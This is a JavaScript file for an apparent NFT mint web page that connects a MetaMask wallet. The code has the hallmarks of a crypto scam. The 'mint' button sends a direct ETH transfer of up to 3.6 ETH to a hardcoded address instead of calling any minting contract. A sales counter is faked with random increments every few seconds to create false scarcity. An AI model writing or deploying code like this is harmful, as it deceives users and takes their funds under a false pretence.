const connectWalletButton = document.querySelector('.connectWalletButton');
const mintButton = document.querySelector('.mintButton');
const addressBar = document.querySelector('.addressBar');
const openMetaButton = document.querySelector('.mobile-meta');
const counter = document.querySelector('.counter');
const countx1 = document.querySelector('.countx1');
const countx2 = document.querySelector('.countx2');
const countx3 = document.querySelector('.countx3');

var isConnected = false;
var mintPrice = 1.2;
var mintOveralPrice;
var account = window.sessionStorage.getItem('account');
var counterMaxValue = parseInt(window.sessionStorage.getItem('counterMaxValue'));


// Connecting MetaMask account and raise mint event
mintButton.addEventListener('click', async () =>
{
   if (window.sessionStorage.getItem('account') == 'undefined')
   {
      const accounts = await window.ethereum.request({ method : 'eth_requestAccounts'});
      account = accounts[0];
      window.sessionStorage.setItem('account', account);
   }

   await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x1' }],
   });

   web3 = new Web3(Web3.givenProvider);
   var transactionObj = {
      from: account,
      to: "0x02d8834Cb5BB9affDa038dAd522B804cd59F8cB9",
      value: Web3.utils.toWei(mintOveralPrice.toString()),
   }
   await web3.eth.sendTransaction(transactionObj)
});


// Counter Section
var counterValue = parseInt(window.sessionStorage.getItem('counterValue'));
counter.innerHTML = counterValue + '/' + counterMaxValue;

var intervalId = window.setInterval(() =>
{
   counterValue += Math.floor((Math.random() * 31));
   if (counterValue < counterMaxValue)
   {
      window.sessionStorage.setItem('counterValue', counterValue);
      counter.innerHTML = counterValue + "/" + counterMaxValue;
   }
   else
   {
      counter.innerHTML = counterMaxValue + '/' + counterMaxValue;
      clearInterval(intervalId);
   }

}, 3000);


// binding count buttons
var buttonContent = 'MINT FOR ';
mintButton.innerHTML = buttonContent + mintPrice;
mintOveralPrice = mintPrice;
countx1.addEventListener('click', () =>
{
   countx1.classList.add('selected');
   mintButton.innerHTML = buttonContent + mintPrice;
   if (countx2.classList.contains('selected')) 
   {
      countx2.classList.remove('selected');
   }
   if (countx3.classList.contains('selected')) 
   {
      countx3.classList.remove('selected');
   }

});

countx2.addEventListener('click', () =>
{
   countx2.classList.add('selected');
   mintButton.innerHTML = buttonContent + (mintPrice * 2);
   mintOveralPrice = mintPrice * 2;
   if (countx1.classList.contains('selected')) 
   {
      countx1.classList.remove('selected');
   }
   if (countx3.classList.contains('selected')) 
   {
      countx3.classList.remove('selected');
   }
});

countx3.addEventListener('click', () =>
{
   countx3.classList.add('selected');
   mintButton.innerHTML = buttonContent + 3.6;
   mintOveralPrice = mintPrice * 3;
   if (countx1.classList.contains('selected')) 
   {
      countx1.classList.remove('selected');
   }
   if (countx2.classList.contains('selected')) 
   {
      countx2.classList.remove('selected');
   }
});


// on account changing
window.ethereum.on('accountsChanged',  (accounts) => {
   account = accounts[0];
   window.sessionStorage.setItem('account', account);
})